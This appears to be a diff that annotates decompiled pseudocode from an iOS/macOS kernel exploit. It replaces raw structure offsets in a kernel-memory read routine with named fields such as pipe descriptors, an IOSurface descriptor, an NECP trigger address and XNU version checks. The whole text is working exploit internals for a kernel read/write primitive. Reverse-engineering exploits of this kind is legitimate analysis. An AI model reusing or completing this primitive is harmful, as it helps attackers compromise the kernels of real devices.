@@ -431,7 +431,7 @@ __int64 __fastcall setup_krw_engine(struct_krwCtx *ctx);
 __int64 __fastcall teardown_krw_thread(struct_krwCtx *ctx);
 __int64 __fastcall get_page_size_for_kaddr(__int64);
 bool __fastcall has_valid_krw_path(struct_krwCtx *ctx);
-__int64 __fastcall kreadbuf_via_dev_null_only(__int64 a1, unsigned __int64 a2, __int64 a3, unsigned int a4, int a5);
+__int64 __fastcall kreadbuf_via_dev_null_only(struct_krwCtx *ctx, unsigned __int64 a2, __int64 a3, unsigned int a4, int a5);
 __int64 __fastcall necp_semaphore_kread(__int64 a1, __int64 a2, char *a3, mach_msg_type_number_t a4);
 __int64 __fastcall necp_fd_verify_roundtrip(__int64 a1, __int64 a2);
 __int64 __fastcall pipe_krw_roundtrip_verify(__int64 a1);
@@ -25973,7 +25973,7 @@ bool __fastcall has_valid_krw_path(struct_krwCtx *ctx)
 }
 
 //----- (0000000000025E54) ----------------------------------------------------
-__int64 __fastcall kreadbuf_via_dev_null_only(__int64 a1, unsigned __int64 a2, __int64 a3, unsigned int a4, int a5)
+__int64 __fastcall kreadbuf_via_dev_null_only(struct_krwCtx *ctx, unsigned __int64 a2, __int64 a3, unsigned int a4, int a5)
 {
   __int64 v5; // x21
   __int64 test; // x26
@@ -26003,11 +26003,11 @@ __int64 __fastcall kreadbuf_via_dev_null_only(__int64 a1, unsigned __int64 a2, _
   uint32_t __s1[42]; // [xsp+D0h] [xbp-110h] BYREF
 
   v5 = 708609;
-  if ( *(uint32_t *)(a1 + 6448) == -1
-    || *(uint32_t *)(a1 + 6452) == -1
-    || *(uint32_t *)(a1 + 6464) == -1
-    || !*(uint64_t *)(a1 + 536)
-    || !check_kaddr_in_physmap((struct_krwCtx *)a1, a2) )
+  if ( KRW_CTX_AT(ctx, uint32_t, KRW_CTX_PIPE_READ_FD_OFFSET) == -1
+    || KRW_CTX_AT(ctx, uint32_t, KRW_CTX_PIPE_WRITE_FD_OFFSET) == -1
+    || KRW_CTX_AT(ctx, uint32_t, KRW_CTX_IOSURFACE_FD_OFFSET) == -1
+    || !KRW_CTX_AT(ctx, uint64_t, KRW_CTX_NECP_TRIGGER_ADDR_OFFSET)
+    || !check_kaddr_in_physmap(ctx, a2) )
   {
     return v5;
   }
@@ -26017,20 +26017,20 @@ __int64 __fastcall kreadbuf_via_dev_null_only(__int64 a1, unsigned __int64 a2, _
     test = fd_open_dev_null(&v34);
     if ( (uint32_t)test )
       goto LABEL_67;
-    test = fd_read_test((int *)(a1 + 6448));
+    test = fd_read_test(&KRW_CTX_AT(ctx, int, KRW_CTX_PIPE_READ_FD_OFFSET));
     if ( (uint32_t)test )
       goto LABEL_67;
   }
   v31 = a5;
-  v33 = (int *)(a1 + 6448);
-  if ( *(uint64_t *)(a1 + 544) )
+  v33 = &KRW_CTX_AT(ctx, int, KRW_CTX_PIPE_READ_FD_OFFSET);
+  if ( KRW_CTX_AT(ctx, uint64_t, KRW_CTX_PPL_DATA_CONST_PTR_OFFSET) )
     v12 = 8;
   else
     v12 = 4;
   if ( !a4 )
   {
 LABEL_61:
-    test = pipe_krw_roundtrip_verify(a1);
+    test = pipe_krw_roundtrip_verify((__int64)ctx);
     goto LABEL_66;
   }
   v13 = 0;
@@ -26040,9 +26040,9 @@ LABEL_61:
     v14 = v13;
     v15 = a2 + v13;
     v16 = a4 - v13;
-    if ( (*(uint64_t *)(a1 + 392) & v15) != 0 || (unsigned int)v16 < 0x4000 || !krw_ctx_has_read_caps((struct_krwCtx *)a1) )
+    if ( (ctx->pageMask & v15) != 0 || (unsigned int)v16 < 0x4000 || !krw_ctx_has_read_caps(ctx) )
       break;
-    v17 = *(uint64_t *)(a1 + 344);
+    v17 = ctx->xnuVersionPacked;
     if ( v17 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
       v18 = 0x4000;
     else
@@ -26053,7 +26053,7 @@ LABEL_61:
       v19 = 528;
     if ( (unsigned int)v16 >= v19 )
       LODWORD(v16) = v19;
-    test = necp_semaphore_kread(a1, v15, (char *)(a3 + v14), v16);
+    test = necp_semaphore_kread((__int64)ctx, v15, (char *)(a3 + v14), v16);
 LABEL_54:
     if ( (uint32_t)test )
       goto LABEL_65;
@@ -26066,18 +26066,18 @@ LABEL_54:
   {
     v20 = 0;
   }
-  else if ( (((v15 - 1 + (unsigned int)v16) ^ (v15 - 1 + v12)) & ~*(uint64_t *)(a1 + 392)) == 0 )
+  else if ( (((v15 - 1 + (unsigned int)v16) ^ (v15 - 1 + v12)) & ~ctx->pageMask) == 0 )
   {
     v20 = 0;
   }
   v21 = v20;
-  if ( !*(uint64_t *)(a1 + 544) )
+  if ( !KRW_CTX_AT(ctx, uint64_t, KRW_CTX_PPL_DATA_CONST_PTR_OFFSET) )
   {
-    v23 = necp_fd_verify_roundtrip(a1, v15 - v20);
+    v23 = necp_fd_verify_roundtrip((__int64)ctx, v15 - v20);
     if ( (uint32_t)v23 )
       goto LABEL_63;
     errno = 0;
-    __s1[0] = fcntl(*(uint32_t *)(a1 + 6464), 5);
+    __s1[0] = fcntl(KRW_CTX_AT(ctx, uint32_t, KRW_CTX_IOSURFACE_FD_OFFSET), 5);
     if ( __s1[0] == -1 && errno )
     {
       v28 = errno;
@@ -26097,13 +26097,13 @@ LABEL_54:
     }
     goto LABEL_53;
   }
-  if ( *v33 == -1 || *(uint32_t *)(a1 + 6452) == -1 || (v22 = *(uint64_t *)(a1 + 536)) == 0 )
+  if ( *v33 == -1 || KRW_CTX_AT(ctx, uint32_t, KRW_CTX_PIPE_WRITE_FD_OFFSET) == -1 || (v22 = KRW_CTX_AT(ctx, uint64_t, KRW_CTX_NECP_TRIGGER_ADDR_OFFSET)) == 0 )
   {
     test = 708609;
     goto LABEL_65;
   }
   memset(__s1, 0, 160);
-  init_necp_option_struct(a1, (__int64)__s1, v22, v15 - v20 - 72, 7);
+  init_necp_option_struct((__int64)ctx, (__int64)__s1, v22, v15 - v20 - 72, 7);
   v23 = fd_write((__int64)v33, __s1, 0xA0u);
   if ( (uint32_t)v23 || (v23 = fd_read(v33, __s2, 0xA0u), (uint32_t)v23) )
   {
@@ -26113,7 +26113,7 @@ LABEL_63:
   }
   if ( !memcmp(__s1, __s2, 0xA0u) )
   {
-    if ( ioctl(*(uint32_t *)(a1 + 6464), 0x40087367u, __s1) )
+    if ( ioctl(KRW_CTX_AT(ctx, uint32_t, KRW_CTX_IOSURFACE_FD_OFFSET), 0x40087367u, __s1) )
     {
       v24 = errno;
       v25 = errno;
@@ -26137,7 +26137,7 @@ LABEL_53:
   }
   test = 708628;
 LABEL_65:
-  pipe_krw_roundtrip_verify(a1);
+  pipe_krw_roundtrip_verify((__int64)ctx);
 LABEL_66:
   if ( v31 )
 LABEL_67:
